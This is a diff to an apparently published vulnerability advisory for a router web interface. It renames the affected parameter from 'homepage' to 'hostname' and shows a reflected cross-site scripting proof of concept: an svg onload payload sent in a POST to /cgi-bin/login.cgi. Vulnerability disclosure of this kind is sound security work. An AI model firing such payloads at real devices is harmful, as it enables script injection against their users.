@@ -26,11 +26,11 @@ This function defines a variable hostname, retrieves its value from the request 
 <div  align="center"><img src="./img/getpar.png" style="zoom:80%;" /></div>
 <div  align="center"><img src="./img/1.png" style="zoom:80%;" /></div>
 
-However，the sub_404F68 function creates a response packet and places the unfiltered value of the homepage into the packet.
+However，the sub_404F68 function creates a response packet and places the unfiltered value of the hostname into the packet.
 
 ## Proof of Concept (PoC)
 
-We set `homepage` as **192.168.6.2"><svg/onload=alert()><div** ,such as:
+We set `hostname` as **192.168.6.2"><svg/onload=alert()><div** ,such as:
 
 ```http
 POST /cgi-bin/login.cgi HTTP/1.1
@@ -52,3 +52,4 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=192.168.6.1&login_page=log
 
 ## outcome
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
